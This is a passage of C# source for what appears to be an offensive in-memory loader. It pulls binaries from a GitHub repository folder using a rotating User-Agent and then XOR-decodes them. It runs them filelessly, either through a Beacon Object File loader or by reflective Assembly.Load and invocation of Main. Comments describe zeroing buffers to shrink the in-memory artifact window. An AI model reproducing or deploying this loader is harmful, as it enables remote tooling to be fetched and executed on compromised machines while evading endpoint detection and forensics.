            catch { /* stub proxy on this system has no credentials — fine */ }

            // ── Validate repo path ────────────────────────────────────────────
            string[] parts = repoPath.Split('/');
            if (parts.Length < 3) { Err("--repo must be owner/name/subfolder"); return; }
            string owner  = parts[0];
            string repo   = parts[1];
            string folder = string.Join("/", parts[2..]);

            // ── HTTP client ───────────────────────────────────────────────────
            using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
            http.DefaultRequestHeaders.Add("User-Agent",
                _userAgents[Random.Shared.Next(_userAgents.Length)]);
            http.DefaultRequestHeaders.Add("Accept", "application/vnd.github+json");
            http.DefaultRequestHeaders.Add("X-GitHub-Api-Version", "2022-11-28");
            if (!string.IsNullOrEmpty(token))
                http.DefaultRequestHeaders.Add("Authorization", $"token {token}");

            // ── List binaries ─────────────────────────────────────────────────
            Info($"Querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");

            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return; }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 403)
            { Err("Rate limit or auth required (403). Use --token."); return; }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return; }

            if (binaries.Count == 0) { Err("No .exe/.dll files found."); return; }

            // ── Menu ──────────────────────────────────────────────────────────
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  Available binaries:\n");
            Console.ResetColor();

            for (int i = 0; i < binaries.Count; i++)
                Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
            Console.WriteLine("  [ 0]  Exit\n");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("  [!] Supports managed .NET assemblies and COFF/BOF files (.o). Native PE binaries will be rejected.\n");
            Console.ResetColor();

            if (listOnly) return;

            (string Name, string DownloadUrl, long Size) chosen = default;

            if (execName != null)
            {
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.Equals(execName, StringComparison.OrdinalIgnoreCase) ||
                    b.Name.Contains(execName, StringComparison.OrdinalIgnoreCase));
                if (chosen.Name == null) { Err($"--exec: no match for '{execName}'"); return; }
                Info($"Selected (--exec): {chosen.Name}");
            }
            else
            {
                Console.Write("Select number or partial filename: ");
                string sel = (Console.ReadLine() ?? "0").Trim();

                if (sel is "0" or "exit" or "q") return;

                if (int.TryParse(sel, out int idx) && idx >= 1 && idx <= binaries.Count)
                    chosen = binaries[idx - 1];
                else
                    chosen = binaries.FirstOrDefault(b =>
                        b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));

                if (chosen.Name == null) { Err($"No match for: {sel}"); return; }
            }

            if (string.IsNullOrEmpty(chosen.DownloadUrl)) { Err($"No download_url for {chosen.Name}"); return; }

            // ── Download ──────────────────────────────────────────────────────
            Info($"Downloading {chosen.Name} ...");
            byte[] asmBytes;
            try   { asmBytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return; }
            Ok($"{asmBytes.Length:N0} bytes received");

            // PAT no longer needed — clear it from the header pool
            http.DefaultRequestHeaders.Remove("Authorization");

            if (xorKey != 0)
            {
                byte[] decoded = XorBytes(asmBytes, xorKey);
                ClearBytes(asmBytes);   // zero the encrypted original before dropping the ref
                asmBytes = decoded;
                Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
            }

            // ── BOF (COFF object) path ────────────────────────────────────────
            if (BofLoader.IsBof(asmBytes))
            {
                Ok($"{chosen.Name} detected as COFF/BOF — using BOF loader");

                string rawBofArgs;
                if (execArgs != null)
                {
                    rawBofArgs = execArgs;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("  BOF args: i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>");
                    Console.ResetColor();
                    Console.Write("Arguments (blank for none): ");
                    rawBofArgs = (Console.ReadLine() ?? "").Trim();
                }

                byte[] packedArgs = PackBofArgs(rawBofArgs);
                Info($"Executing BOF {chosen.Name}{(packedArgs.Length > 0 ? $" ({packedArgs.Length} packed bytes)" : "")} ...\n");
                try   { BofLoader.Execute(asmBytes, packedArgs); }
                catch (Exception ex) { Warn($"BOF error: {ex.Message}"); }
                ClearBytes(asmBytes);
                Info("Done.");
                return;
            }

            // ── Verify managed assembly ───────────────────────────────────────
            if (!IsNetAssembly(asmBytes))
            {
                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — cannot reflectively load.");
                ClearBytes(asmBytes);
                return;
            }

            // ── Load ──────────────────────────────────────────────────────────
            Assembly asm;
            try   { asm = Assembly.Load(asmBytes); }
            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); ClearBytes(asmBytes); return; }

            // Zero the download buffer — reduce in-memory artifact window
            ClearBytes(asmBytes);

            MethodInfo? entry = FindMain(asm);
            if (entry == null) { Err($"No static Main found in {chosen.Name}"); return; }
            Ok($"Entry point: {entry.DeclaringType?.FullName}::{entry.Name}");

            // ── Args ──────────────────────────────────────────────────────────
            string[] toolArgs;
            string   argsDisplay;
            if (execArgs != null)
            {
                toolArgs    = ParseArgs(execArgs);
                argsDisplay = execArgs;
            }
            else
            {
                Console.Write("Arguments (blank for none): ");
                string raw  = (Console.ReadLine() ?? "").Trim();
                toolArgs    = string.IsNullOrWhiteSpace(raw) ? Array.Empty<string>() : ParseArgs(raw);
                argsDisplay = raw;
            }

            Info($"Executing {chosen.Name}{(toolArgs.Length > 0 ? $" -- {argsDisplay}" : "")} ...\n");

            // ── Invoke ────────────────────────────────────────────────────────
            try
            {
                ParameterInfo[] parms = entry.GetParameters();
                object? result = parms.Length == 0
                    ? entry.Invoke(null, null)
                    : entry.Invoke(null, new object[] { toolArgs });

                // If the loaded tool has an async Main, Invoke returns a Task without
                // awaiting it. GetAwaiter().GetResult() blocks until it completes.
                if (result is Task t) t.GetAwaiter().GetResult();
            }
            catch (TargetInvocationException tie)
            { Warn($"Tool exception: {tie.InnerException?.Message ?? tie.Message}"); }
            catch (Exception ex)
            { Warn($"Invocation error: {ex.Message}"); }

            Info("Done.");
        }
    }
}
